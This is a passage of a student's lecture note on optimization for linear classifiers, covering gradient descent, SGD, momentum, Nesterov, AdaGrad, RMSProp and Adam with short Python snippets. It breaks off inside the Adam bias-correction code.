<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1702 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 60 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 10 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<div class="admonition quote">
<p class="admonition-title">Quote</p>
<p>对于矩阵求导的知识，可以参考<a href="https://zhuanlan.zhihu.com/p/273729929">矩阵求导</a></p>
</div>
<p>For linear classifiers, we need to find the best weight matrix <span class="arithmatex">\(W\)</span> to separate the data.</p>
<p>A simple idea is to find such a <span class="arithmatex">\(W^*\)</span> that satisfies the following equation:</p>
<div class="arithmatex">\[
    W^* = \arg\min_{W} L(W)
\]</div>
<p>where <span class="arithmatex">\(L(W)\)</span> is the loss function.</p>
<p>Now our goal is similar to the following case:</p>
<p><em>A blind man on the top of a hill, looking for the lowest point.</em></p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec3-1.png" width="600" />
</figure>
<h2 id="note-cs-cv-lec3-random-search">Random Search<a class="headerlink" href="#note-cs-cv-lec3-random-search" title="Permanent link">&para;</a></h2>
<p>The first idea is to try random search,we loop through the parameter space and find the best <span class="arithmatex">\(W\)</span> that minimizes the loss function.</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-cv-lec3-__codelineno-0-1"></a><span class="n">bestloss</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="s1">&#39;inf&#39;</span><span class="p">)</span>  <span class="c1"># Python assigns the highest possible float value</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-cv-lec3-__codelineno-0-2"></a><span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-cs-cv-lec3-__codelineno-0-3"></a>    <span class="n">W</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">3073</span><span class="p">)</span> <span class="o">*</span> <span class="mf">0.0001</span>  <span class="c1"># generate random parameters</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-cs-cv-lec3-__codelineno-0-4"></a>    <span class="n">loss</span> <span class="o">=</span> <span class="n">L</span><span class="p">(</span><span class="n">X_train</span><span class="p">,</span> <span class="n">Y_train</span><span class="p">,</span> <span class="n">W</span><span class="p">)</span>  <span class="c1"># get the loss over the entire training set</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-cs-cv-lec3-__codelineno-0-5"></a>    <span class="k">if</span> <span class="n">loss</span> <span class="o">&lt;</span> <span class="n">bestloss</span><span class="p">:</span>  <span class="c1"># keep track of the best solution</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-cs-cv-lec3-__codelineno-0-6"></a>        <span class="n">bestloss</span> <span class="o">=</span> <span class="n">loss</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-cs-cv-lec3-__codelineno-0-7"></a>        <span class="n">bestW</span> <span class="o">=</span> <span class="n">W</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-cs-cv-lec3-__codelineno-0-8"></a>    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;in attempt </span><span class="si">%d</span><span class="s1"> the loss was </span><span class="si">%f</span><span class="s1">, best </span><span class="si">%f</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">loss</span><span class="p">,</span> <span class="n">bestloss</span><span class="p">))</span>
</span></code></pre></div>
<p>This is a simple idea that gets nearly 15.5% accuracy.(the best accuracy is ~95%)</p>
<h2 id="note-cs-cv-lec3-follow-the-slope">Follow the slope<a class="headerlink" href="#note-cs-cv-lec3-follow-the-slope" title="Permanent link">&para;</a></h2>
<p>Although the man on the hill is blind, he can feel the slope near him using his foot or stick.And follow the slope to find the lowest point.This is kind of <a href="#note-ads-wk11"><em>local search</em>.</a></p>
<p>In 1-D case, the slope is the derivative of the loss function.</p>
<div class="arithmatex">\[
    \frac{dL}{dx}=f'(x)
\]</div>
<p>And in multi-dimensional case, the gradient is the vector of partial derivatives along each dimension.</p>
<p>The slope in any direction is the dot product of the direction with the gradient
The direction of steepest descent is the negative gradient (方向导数)</p>
<p>When computing Gradients，we have the following methods:</p>
<ol>
<li>Numerical Gradient</li>
<li>Analytical Gradient</li>
</ol>
<h3 id="note-cs-cv-lec3-numerical-gradient">Numerical Gradient<a class="headerlink" href="#note-cs-cv-lec3-numerical-gradient" title="Permanent link">&para;</a></h3>
<p>Numerical Gradient is a technique used to approximate the gradient of a function through numerical methods. It is particularly useful in optimization problems in computer science and machine learning when the analytical gradient is not readily available.</p>
<p>The basic idea of the numerical gradient is to use finite differences to estimate the gradient of a function at a point. Specifically, for a function <span class="arithmatex">\( f \)</span> and a point <span class="arithmatex">\( x \)</span>, the numerical gradient can be calculated using the following formula:</p>
<div class="arithmatex">\[
\frac{\partial f}{\partial x_i} \approx \frac{f(x + h \cdot e_i) - f(x)}{h}
\]</div>
<p>where:</p>
<ul>
<li><span class="arithmatex">\( h \)</span> is a very small number, often referred to as the step size.</li>
<li><span class="arithmatex">\( e_i \)</span> is a unit vector with 1 at the <span class="arithmatex">\( i \)</span>-th position and 0 elsewhere.</li>
</ul>
<p>This method allows us to compute the partial derivatives for each dimension, resulting in the gradient vector at that point.</p>
<p>The advantage of numerical gradient is its simplicity and ease of implementation, as it does not require the analytical form of the function. However, it can be computationally expensive, especially in high-dimensional spaces, and may introduce numerical errors due to the approximation.</p>
<p>An example of numerical gradient is:</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec3-2.png" width="600" />
</figure>
<h3 id="note-cs-cv-lec3-analytical-gradient">Analytical Gradient<a class="headerlink" href="#note-cs-cv-lec3-analytical-gradient" title="Permanent link">&para;</a></h3>
<p>Analytical Gradient is a technique for directly computing the gradient of a function using analytical methods. Unlike numerical gradient, analytical gradient relies on the mathematical expression of the function and uses differentiation rules to obtain the gradient.</p>
<p>For a function <span class="arithmatex">\( f \)</span>, the analytical gradient at a point <span class="arithmatex">\( x \)</span> is obtained by computing the partial derivatives of the function. For a multi-dimensional function, the analytical gradient is a vector composed of the partial derivatives with respect to each variable:</p>
<div class="arithmatex">\[
\nabla f(x) = \left( \frac{\partial f}{\partial x_1}, \frac{\partial f}{\partial x_2}, \ldots, \frac{\partial f}{\partial x_n} \right)
\]</div>
<p>The advantages of analytical gradient include:</p>
<ul>
<li><strong>Accuracy</strong>: Since it is computed using analytical methods, there is no numerical error.</li>
<li><strong>Efficiency</strong>: In many cases, computing the analytical gradient is faster than the numerical gradient, especially in high-dimensional spaces.</li>
</ul>
<p>However, calculating the analytical gradient requires a clear mathematical expression of the function, and for some complex functions, differentiation can become very complicated. In such cases, numerical gradient might be a simpler alternative.</p>
<div class="admonition advice">
<p class="admonition-title">Advice</p>
<p>in practice, Always use analytic gradient, but check implementation 
with numerical gradient. This is called a gradient check.</p>
<p>in the <code>torch</code> library, we can use <code>torch.autograd</code> to compute the gradient.
<code>torch.autograd.gradcheck</code> and <code>torch.autograd.gradgradcheck</code> are two functions that can be used to check the gradient.</p>
</div>
<p>So follow the slop,we use Gradient Descent(梯度下降) to update the parameters.</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-cv-lec3-__codelineno-1-1"></a><span class="n">w</span> <span class="o">=</span> <span class="n">initialize_weights</span><span class="p">()</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-cv-lec3-__codelineno-1-2"></a>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-cs-cv-lec3-__codelineno-1-3"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_iterations</span><span class="p">):</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-cs-cv-lec3-__codelineno-1-4"></a>    <span class="n">dw</span> <span class="o">=</span> <span class="n">compute_gradient</span><span class="p">(</span><span class="n">loss_fn</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">w</span><span class="p">)</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-cs-cv-lec3-__codelineno-1-5"></a>    <span class="n">w</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">dw</span>
</span></code></pre></div>
<p>The <strong>Hyperparameter</strong> are:</p>
<ul>
<li>initialize function</li>
<li>number of iterations</li>
<li>learning rate</li>
</ul>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec3-3.png" width="500" />
</figure>
<h2 id="note-cs-cv-lec3-sgd">SGD<a class="headerlink" href="#note-cs-cv-lec3-sgd" title="Permanent link">&para;</a></h2>
<p>Stochastic Gradient Descent(SGD) is a variant of Gradient Descent that updates the parameters using a <em>single sample</em> at a time.Because the full gradient is too expensive to compute when we have a large dataset.</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-cv-lec3-__codelineno-2-1"></a><span class="n">w</span> <span class="o">=</span> <span class="n">initialize_weights</span><span class="p">()</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-cs-cv-lec3-__codelineno-2-2"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_iterations</span><span class="p">):</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-cs-cv-lec3-__codelineno-2-3"></a>    <span class="n">minibatch</span> <span class="o">=</span> <span class="n">sample_data</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">batch_size</span><span class="p">)</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-cs-cv-lec3-__codelineno-2-4"></a>    <span class="n">dw</span> <span class="o">=</span> <span class="n">compute_gradient</span><span class="p">(</span><span class="n">loss_fn</span><span class="p">,</span> <span class="n">minibatch</span><span class="p">,</span> <span class="n">w</span><span class="p">)</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-cs-cv-lec3-__codelineno-2-5"></a>    <span class="n">w</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">dw</span>
</span></code></pre></div>
<p>We  Think of loss as an expectation over the full data distribution <span class="arithmatex">\(p_{data}\)</span></p>
<p>Approximate expectation via sampling</p>
<div class="arithmatex">\[
    L(W) = \mathbb{E}_{(x,y) \sim p_{data}} [L(W;x,y)] + \lambda R(W) \approx \frac{1}{N} \sum_{i=1}^{N} L(W;x_i,y_i) + \lambda R(W)
\]</div>
<p>and</p>
<div class="arithmatex">\[
    \nabla_W L(W) = \nabla_W \mathbb{E}_{(x,y) \sim p_{data}} [L(x, y, W)] + \lambda \nabla_W R(W) 
    \approx \sum_{i=1}^{N} \nabla_W L(W; x_i, y_i, W) + \nabla_W R(W)
\]</div>
<h3 id="note-cs-cv-lec3-probelms-with-sgd">Probelms with SGD<a class="headerlink" href="#note-cs-cv-lec3-probelms-with-sgd" title="Permanent link">&para;</a></h3>
<h4 id="note-cs-cv-lec3-oscillation">Oscillation<a class="headerlink" href="#note-cs-cv-lec3-oscillation" title="Permanent link">&para;</a></h4>
<p>What if loss changes quickly in one direction and slowly in another?
What does gradient descent do?</p>
<blockquote>
<p>Very slow progress along shallow direction, jitter along steep direction</p>
</blockquote>
<p>Because when we update the parameters, we simply follow the gradient, so if the gradient is small, the update will be small,cause it stays almost the same.But if the gradient is large, the update will be large,cause it changes too much, may cross the valley and go up,so will oscillate.</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec3-4.png" width="500" />
</figure>
<h4 id="note-cs-cv-lec3-saddle-point">Saddle Point<a class="headerlink" href="#note-cs-cv-lec3-saddle-point" title="Permanent link">&para;</a></h4>
<p>What if the loss function has a local minimum or saddle point?</p>
<blockquote>
<p>Local minimum: gradient is 0, can't move,达到了局部最优</p>
</blockquote>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec3-5.png" width="60%" />
</figure>
<h2 id="note-cs-cv-lec3-sgdmomentum">SGD+Momentum<a class="headerlink" href="#note-cs-cv-lec3-sgdmomentum" title="Permanent link">&para;</a></h2>
<p>To escape from local minima, we introduce momentum, which gives gradient descent a certain amount of inertia. This allows it to continue moving even when the gradient is zero, similar to how a ball rolling down a hill continues to move even when it reaches the bottom.</p>
<hr />
<p>In SGD:</p>
<div class="arithmatex">\[
    x_{t+1} = x_t - \alpha \nabla f(x_t)
\]</div>
<hr />
<p>In SGD+Momentum:</p>
<div class="arithmatex">\[
    v_{t+1} = \rho v_t + \nabla f(x_t)
\]</div>
<div class="arithmatex">\[
    x_{t+1} = x_t - \alpha v_{t+1}
\]</div>
<ul>
<li>Build up "velocity" as a running mean of gradients</li>
<li>Rho gives "friction"; typically <span class="arithmatex">\(\rho=0.9\)</span> or <span class="arithmatex">\(0.99\)</span></li>
</ul>
<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-cv-lec3-__codelineno-3-1"></a><span class="n">v</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-cs-cv-lec3-__codelineno-3-2"></a><span class="n">rho</span> <span class="o">=</span> <span class="mf">0.9</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-cs-cv-lec3-__codelineno-3-3"></a>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-cs-cv-lec3-__codelineno-3-4"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_steps</span><span class="p">):</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#note-cs-cv-lec3-__codelineno-3-5"></a>    <span class="n">dw</span> <span class="o">=</span> <span class="n">compute_gradient</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#note-cs-cv-lec3-__codelineno-3-6"></a>    <span class="n">v</span> <span class="o">=</span> <span class="n">rho</span> <span class="o">*</span> <span class="n">v</span> <span class="o">+</span> <span class="n">dwb</span> 
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#note-cs-cv-lec3-__codelineno-3-7"></a>    <span class="n">w</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">v</span>
</span></code></pre></div>
<hr />
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec3-6.png" width="60%" />

<figcaption> 
Combine gradient at current point 
with velocity to get step used to 
update weights
</figcaption>
</figure>
<h3 id="note-cs-cv-lec3-nesterov-momentum">Nesterov Momentum<a class="headerlink" href="#note-cs-cv-lec3-nesterov-momentum" title="Permanent link">&para;</a></h3>
<p>Nesterov Momentum is a variant of Momentum that uses the gradient at the next point to update the parameters.</p>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec3-7.png" width="60%" />

<figcaption> 
"Look ahead" to the point where updating using velocity would take us; compute gradient there and mix it with velocity to get actual update direction
</figcaption>
</figure>
<div class="arithmatex">\[
    v_{t+1} = \rho v_t - \alpha \nabla f(x_t + \rho v_t)
\]</div>
<div class="arithmatex">\[
    x_{t+1} = x_t + v_{t+1}
\]</div>
<p>But this format is a little bit annoying, so we can rewrite it as:</p>
<div class="arithmatex">\[
\text{Change of variables } \tilde{x}_t = x_t + \rho v_t \text{ and rearrange:}
\]</div>
<div class="arithmatex">\[
    x_{t} = \tilde{x}_t - \rho v_t 
\]</div>
<div class="arithmatex">\[
v_{t+1} = \rho v_t - \alpha \nabla f(\tilde{x}_t)
\]</div>
<div class="arithmatex">\[
\tilde{x}_{t+1} = \tilde{x}_t + v_{t+1} + \rho(v_{t+1} - v_t)
\]</div>
<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-cv-lec3-__codelineno-4-1"></a><span class="n">v</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-cs-cv-lec3-__codelineno-4-2"></a><span class="n">rho</span> <span class="o">=</span> <span class="mf">0.9</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#note-cs-cv-lec3-__codelineno-4-3"></a>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#note-cs-cv-lec3-__codelineno-4-4"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_steps</span><span class="p">):</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#note-cs-cv-lec3-__codelineno-4-5"></a>    <span class="n">dw</span> <span class="o">=</span> <span class="n">compute_gradient</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#note-cs-cv-lec3-__codelineno-4-6"></a>    <span class="n">old_v</span> <span class="o">=</span> <span class="n">v</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#note-cs-cv-lec3-__codelineno-4-7"></a>    <span class="n">v</span> <span class="o">=</span> <span class="n">rho</span> <span class="o">*</span> <span class="n">v</span> <span class="o">-</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">dw</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#note-cs-cv-lec3-__codelineno-4-8"></a>    <span class="n">w</span> <span class="o">=</span> <span class="n">w</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">rho</span><span class="p">)</span> <span class="o">*</span> <span class="n">v</span> <span class="o">-</span> <span class="n">rho</span> <span class="o">*</span> <span class="n">old_v</span>
</span></code></pre></div>
<h2 id="note-cs-cv-lec3-adagrad">AdaGrad<a class="headerlink" href="#note-cs-cv-lec3-adagrad" title="Permanent link">&para;</a></h2>
<p>Added element-wise scaling of the gradient based on the historical sum of squares in each dimension.</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-cv-lec3-__codelineno-5-1"></a><span class="n">grad_squared</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-cs-cv-lec3-__codelineno-5-2"></a>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#note-cs-cv-lec3-__codelineno-5-3"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_steps</span><span class="p">):</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#note-cs-cv-lec3-__codelineno-5-4"></a>    <span class="n">dw</span> <span class="o">=</span> <span class="n">compute_gradient</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#note-cs-cv-lec3-__codelineno-5-5"></a>    <span class="n">grad_squared</span> <span class="o">+=</span> <span class="n">dw</span> <span class="o">*</span> <span class="n">dw</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#note-cs-cv-lec3-__codelineno-5-6"></a>    <span class="n">w</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">dw</span> <span class="o">/</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">grad_squared</span><span class="p">)</span> <span class="o">+</span> <span class="mf">1e-7</span><span class="p">)</span>
</span></code></pre></div>
<p>by doing this, when we meet a large gradient, the learning rate will be small, and when we meet a small gradient, the learning rate will be larger.</p>
<p>But it still has a problem, the grad_squared will always increase, so the learning rate will become smaller and smaller, and finally become near 0.</p>
<p>So we can use the following method to fix it:</p>
<h3 id="note-cs-cv-lec3-rmsprop">RMSProp<a class="headerlink" href="#note-cs-cv-lec3-rmsprop" title="Permanent link">&para;</a></h3>
<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-cv-lec3-__codelineno-6-1"></a><span class="n">grad_squared</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-cs-cv-lec3-__codelineno-6-2"></a>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#note-cs-cv-lec3-__codelineno-6-3"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_steps</span><span class="p">):</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#note-cs-cv-lec3-__codelineno-6-4"></a>    <span class="n">dw</span> <span class="o">=</span> <span class="n">compute_gradient</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#note-cs-cv-lec3-__codelineno-6-5"></a>    <span class="n">grad_squared</span> <span class="o">=</span> <span class="n">decay_rate</span> <span class="o">*</span> <span class="n">grad_squared</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">decay_rate</span><span class="p">)</span> <span class="o">*</span> <span class="n">dw</span> <span class="o">*</span> <span class="n">dw</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#note-cs-cv-lec3-__codelineno-6-6"></a>    <span class="n">w</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">dw</span> <span class="o">/</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">grad_squared</span><span class="p">)</span> <span class="o">+</span> <span class="mf">1e-7</span><span class="p">)</span>
</span></code></pre></div>
<h3 id="note-cs-cv-lec3-adam">Adam<a class="headerlink" href="#note-cs-cv-lec3-adam" title="Permanent link">&para;</a></h3>
<p>Adam is a variant of RMSProp that uses the momentum and the gradient at the current point to update the parameters.</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-cv-lec3-__codelineno-7-1"></a><span class="n">moment1</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-cs-cv-lec3-__codelineno-7-2"></a><span class="n">moment2</span> <span class="o">=</span> <span class="mi">0</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-cs-cv-lec3-__codelineno-7-3"></a>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#note-cs-cv-lec3-__codelineno-7-4"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">num_steps</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>  <span class="c1"># Start at t = 1</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#note-cs-cv-lec3-__codelineno-7-5"></a>    <span class="n">dw</span> <span class="o">=</span> <span class="n">compute_gradient</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#note-cs-cv-lec3-__codelineno-7-6"></a>    <span class="n">moment1</span> <span class="o">=</span> <span class="n">beta1</span> <span class="o">*</span> <span class="n">moment1</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">beta1</span><span class="p">)</span> <span class="o">*</span> <span class="n">dw</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#note-cs-cv-lec3-__codelineno-7-7"></a>    <span class="n">moment2</span> <span class="o">=</span> <span class="n">beta2</span> <span class="o">*</span> <span class="n">moment2</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">beta2</span><span class="p">)</span> <span class="o">*</span> <span class="n">dw</span> <span class="o">*</span> <span class="n">dw</span>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#note-cs-cv-lec3-__codelineno-7-8"></a>    <span class="n">w</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">moment1</span> <span class="o">/</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">moment2</span><span class="p">)</span> <span class="o">+</span> <span class="mf">1e-7</span><span class="p">)</span>
</span></code></pre></div>
<p>This has a problem too,when at <code>t=1</code>,assume beta2=0.999,then the moment2 will be very small,so the learning rate will be very large</p>
<p>So we can use the following method(Bias Correction) to fix it:</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-cv-lec3-__codelineno-8-1"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">num_steps</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>  <span class="c1"># Start at t = 1</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-cs-cv-lec3-__codelineno-8-2"></a>    <span class="n">dw</span> <span class="o">=</span> <span class="n">compute_gradient</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#note-cs-cv-lec3-__codelineno-8-3"></a>    <span class="n">moment1</span> <span class="o">=</span> <span class="n">beta1</span> <span class="o">*</span> <span class="n">moment1</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">beta1</span><span class="p">)</span> <span class="o">*</span> <span class="n">dw</span> <span class="c1">#Momentum</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#note-cs-cv-lec3-__codelineno-8-4"></a>    <span class="n">moment2</span> <span class="o">=</span> <span class="n">beta2</span> <span class="o">*</span> <span class="n">moment2</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">beta2</span><span class="p">)</span> <span class="o">*</span> <span class="n">dw</span> <span class="o">*</span> <span class="n">dw</span> <span class="c1">#RMSProp</span>
